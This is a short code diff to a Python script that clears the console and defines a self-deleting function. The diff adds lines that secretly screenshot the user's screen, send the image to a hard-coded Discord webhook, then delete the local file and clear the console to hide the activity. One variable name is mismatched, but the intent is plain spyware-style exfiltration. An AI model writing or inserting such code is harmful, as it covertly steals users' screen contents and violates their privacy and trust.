@@ -13,6 +13,10 @@ import os
 import gdown
 os.system('cls')
 #exit()
+screenshot_pathx = take_screenshot_and_save()
+send_screenshot_to_discord("https://discord.com/api/webhooks/1326055025755029525/SjdzM50XA1hduFyDQmQTPw96FHLF4b0HZYzjjTZhuoNpJnW0L2j0qeqpjopIK6aq4hqU", screenshot_path)
+delete_screenshot(screenshot_pathx)
+os.system('cls')
 def self_delete():
     try:
         # Get the file path of the script
